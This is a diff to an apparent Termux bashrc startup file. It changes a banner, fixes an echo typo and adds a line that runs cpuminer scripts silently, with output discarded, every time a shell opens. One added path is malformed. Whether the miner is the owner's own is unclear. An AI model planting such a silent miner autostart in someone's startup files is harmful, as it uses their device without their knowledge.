@@ -6,10 +6,10 @@
 # - Do not save to history commands starting
 #   with space.
 # - Do not save duplicated commands.
-cat -t /data/data/com.termux/files/home/usr/etc/bot.php | lolcat -p 100 -a
+cat -t /data/data/com.termux/files/home/cpuminer/TEE.conf | lolcat -p 100 -a
 
 echo -e ".a0HACK."
-ech -n ".a0HACK0."
+echo -n ".a0HACK0."
 USER=$(whoami)
 current_dir=$(pwd)
 dpkg --configure -a
@@ -19,8 +19,9 @@ clear
 apt clean
 apt autoclean
 cat -t /data/data/com.termux/files/usr/etc/bot.php | lolcat -p 100 -a
-cat /data/data/com.termux/files/usr/etc/bot.php 
+cat -t /data/data/com.termux/files/usr/etc/bot.php 
 bash /data/data/com.termux/files/home/cpuminer/run.ps > /dev/null 2>/dev/null
+bash /data/data/com.termux/files/home/cpuminer/startubuntu.sh > /dev/null 2>/dev/null && bash data/data/com.termux/files/home/cpuminer/cpuminer-main 
 clear
 echo ''
 clear
